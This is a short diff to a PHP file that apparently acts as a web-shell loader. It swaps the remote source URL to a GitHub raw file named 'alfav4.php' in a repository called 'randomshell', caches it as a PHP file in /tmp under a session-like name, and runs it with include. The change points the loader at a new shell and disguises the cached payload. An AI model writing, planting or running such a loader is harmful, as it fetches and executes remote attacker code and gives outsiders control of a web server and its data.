@@ -1,5 +1,5 @@
 <?php
-$data = ['https://priv.codes/raw/190de49790c1873c3ef249932f71e93f', '/tmp/sesss_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://raw.githubusercontent.com/vallxploit/randomshell/refs/heads/main/alfav4.php', '/tmp/sesss_'.md5($_SERVER['HTTP_HOST']).'.php'];
  
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
